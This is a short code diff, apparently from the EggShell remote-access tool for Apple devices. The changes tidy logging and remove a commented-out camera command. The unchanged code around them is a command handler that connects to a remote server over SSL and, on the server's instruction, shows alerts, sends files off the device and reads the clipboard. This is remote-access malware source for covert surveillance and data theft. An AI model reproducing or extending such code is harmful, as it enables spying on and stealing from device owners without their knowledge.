@@ -72,10 +72,8 @@ NSString* getFullCMD(NSDictionary* dict) {
 }
 
 void connectToServer(NSDictionary* arguments) {
-  os_log_with_type(OS_LOG_DEFAULT, OS_LOG_TYPE_DEFAULT,
-                   "This is a debug message.");
   if (!arguments) {
-    printf("Error: No/insufficent arguments provided!");
+    printf("Error: No/insufficent arguments provided!\n");
     return;
   }
   NSLog(@"Arguments:\t%@", arguments);
@@ -126,7 +124,7 @@ void connectToServer(NSDictionary* arguments) {
 }
 
 void interact(NSDictionary* arguments) {
-  NSLog(@"EggShell in this bih");
+  NSLog(@"Interaction started");
   espl* esCommand = [[espl alloc] init];
   esCommand->client_ssl = client_ssl;
 
@@ -143,10 +141,7 @@ void interact(NSDictionary* arguments) {
     [esCommand debugLog:[NSString stringWithFormat:@"%@", jsonDict]];
     if ([cmd isEqualToString:@"alert"]) {
       [esCommand showAlert:args];
-    } /* else if ([cmd isEqualToString:@"picture"]) {
-    [esCommand takePicture:[args boolValue]];
-}*/
-    else if ([cmd isEqualToString:@"download"]) {
+    } else if ([cmd isEqualToString:@"download"]) {
       [esCommand sendFile:args];
     } else if ([cmd isEqualToString:@"getpaste"]) {
       [esCommand getPasteBoard];
